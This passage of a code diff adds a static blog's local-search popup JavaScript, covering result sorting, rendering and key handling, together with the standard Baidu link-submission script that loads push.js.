+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
 
 
 
@@ -1879,6 +2566,21 @@
   
 
   
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
 
   
 
